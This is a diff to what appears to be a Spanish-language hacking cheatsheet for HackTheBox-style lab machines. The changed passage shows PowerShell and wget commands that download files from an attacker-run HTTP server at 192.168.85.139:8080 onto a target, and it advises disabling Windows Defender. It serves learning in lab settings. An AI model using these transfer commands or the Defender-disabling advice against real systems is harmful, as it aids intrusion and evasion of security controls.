@@ -1368,10 +1368,25 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
                 127.0.0.1 - - [06/Sep/2022 11:39:41] "GET / HTTP/1.1" 200 -
 
             Digamos que quieres enviar a la máquina windows un fichero almacenado en la máquina victima. 
+            
             Comando para recibir el fichero en Windows:
 
                 powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.85.139:8080/CheatsheetHacking.md','C:\Users\test\Desktop\CheatsheetHacking.md')"
 
+            Otra forma:
+
+            Abre powershell y escribe, (tienes que tener abierto el puerto 8080 en el firewall de linux y probablemente desactivar Defender en Windows):
+
+            PS C:\Users\IEUser> Invoke-Webrequest -uri http://192.168.85.139:8080/CheatsheetHacking.md -outfile CheatSheetHacking.md
+            PS C:\Users\IEUser> dir .\CheatSheetHacking.md
+
+
+            Directorio: C:\Users\IEUser
+
+
+            Mode                LastWriteTime         Length Name
+            ----                -------------         ------ ----
+            -a----       09/09/2022      3:59         271012 CheatSheetHacking.md
             Comando para recibir el fichero en Linux:
 
                 wget http://192.168.20.X:8080/FiletoTransfer
